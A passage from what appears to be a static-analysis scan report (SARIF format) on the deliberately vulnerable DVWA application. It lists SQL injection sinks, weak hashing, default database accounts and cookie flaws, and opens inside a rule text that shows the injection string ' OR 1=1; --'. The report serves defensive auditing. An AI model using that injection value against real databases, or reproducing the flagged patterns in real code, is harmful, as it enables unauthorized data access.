= \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4710/?engineType=SCA&issue=E2D27723E0050048E83DA5B76DEC83CA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        } ]
      }
    },
    "results" : [ {
      "ruleId" : "4418",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "22A552C1D0B7DE6004DF7B0D41D1269C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_mssql_db.sql"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - hashbytes()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - hashbytes()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4649",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B78505312C2AE113116E2450770BDE09"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_mssql_db.sql"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4685",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "D430C4E7F2BB607CB88903212658190C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_mssql_db.sql"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_mssql_db.sql:11 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_mssql_db.sql"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4441",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "3125AFD55D45BADB58EE834109C680C4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_postgresql_db.sql"
          },
          "region" : {
            "startLine" : 3,
            "endLine" : 3,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4687",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "D713418FE0AFB00CF98631F0767AF542"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_postgresql_db.sql"
          },
          "region" : {
            "startLine" : 3,
            "endLine" : 3,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4726",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "ED77F6617A981440EFB19740A3EC5EE3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_postgresql_db.sql"
          },
          "region" : {
            "startLine" : 3,
            "endLine" : 3,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_postgresql_db.sql:3 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_postgresql_db.sql"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4548",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "72705B3EA303DABE9054474BD60A00DC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_sqlite_db.sql"
          },
          "region" : {
            "startLine" : 21,
            "endLine" : 21,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_sqlite_db.sql:21 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_sqlite_db.sql"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_sqlite_db.sql:21 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_sqlite_db.sql"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4700",
      "message" : {
        "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "E012F4752169342169741E2950CE382D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "database/create_sqlite_db.sql"
          },
          "region" : {
            "startLine" : 21,
            "endLine" : 21,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "create_sqlite_db.sql:21 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_sqlite_db.sql"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "create_sqlite_db.sql:21 - StringLiteral"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "database/create_sqlite_db.sql"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4474",
      "message" : {
        "text" : "On line 23 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "4DE40793DD1EAF073F0696D1D59D1A46"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/MySQL.php"
          },
          "region" : {
            "startLine" : 23,
            "endLine" : 23,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MySQL.php:23 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:23 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4601",
      "message" : {
        "text" : "On line 29 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9649C54EF86E67BEF9F3FEF2B34AB3E8"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/MySQL.php"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MySQL.php:29 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:29 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4480",
      "message" : {
        "text" : "On line 37 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5217A5CC445CBB5801B57000D43A76DE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/MySQL.php"
          },
          "region" : {
            "startLine" : 37,
            "endLine" : 37,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MySQL.php:37 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:37 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 37
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4368",
      "message" : {
        "text" : "Line 60 of MySQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "032EC727841646B522CCC764AEF636C2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/MySQL.php"
          },
          "region" : {
            "startLine" : 60,
            "endLine" : 60,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "MySQL.php:51 - Read $_SERVER['SCRIPT_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:60 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:51 - Read $_SERVER['SCRIPT_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:51 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:51 - Assignment to $base_dir"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:52 - Assignment to $avatarUrl"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 52
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:54 - Assignment to $insert"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 54
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "MySQL.php:60 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/MySQL.php"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4593",
      "message" : {
        "text" : "On line 18 of PGSQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "9293F4734572E9C37681DE03DE49EA88"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/PGSQL.php"
          },
          "region" : {
            "startLine" : 18,
            "endLine" : 18,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:18 - pg_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:18 - pg_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4745",
      "message" : {
        "text" : "On line 25 of PGSQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F56B1F0126F201CE3594086E6696AD3D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/PGSQL.php"
          },
          "region" : {
            "startLine" : 25,
            "endLine" : 25,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:25 - pg_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:25 - pg_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4391",
      "message" : {
        "text" : "Line 66 of PGSQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "138A50507C0E35ADFBD7FF75D8848BA3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/PGSQL.php"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Read $_SERVER['PHP_SELF']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:66 - pg_query(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Read $_SERVER['PHP_SELF']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Assignment to $baseUrl"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:58 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 58
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:58 - Assignment to $baseUrl"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 58
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:60 - Assignment to $insert"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:66 - pg_query(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4454",
      "message" : {
        "text" : "Line 66 of PGSQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "3BE6065DDE47C93A558D70D1EFAC4D68"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/DBMS/PGSQL.php"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Read $_SERVER['SERVER_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:66 - pg_query(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Read $_SERVER['SERVER_NAME']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:56 - Assignment to $baseUrl"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 56
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:58 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 58
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:58 - Assignment to $baseUrl"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 58
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:60 - Assignment to $insert"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 60
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "PGSQL.php:66 - pg_query(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/DBMS/PGSQL.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4426",
      "message" : {
        "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to setcookie() on line 153. The information revealed by setcookie() could help an adversary form a plan of attack.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "27E51EE72CCC2DDEEC6BD52BBD140A0E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 153,
            "endLine" : 153,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - session_id(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - session_id(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4576",
      "message" : {
        "text" : "A cookie with an overly broad path can be accessed through other applications on the same domain.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "8B43EFF9DC6F2B4BC374031575D0BA61"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 153,
            "endLine" : 153,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4648",
      "message" : {
        "text" : "The program creates a cookie in dvwaPage.inc.php on line 153, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "B6BB896B43F1B1FA2ED07DDB9EDD65CA"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
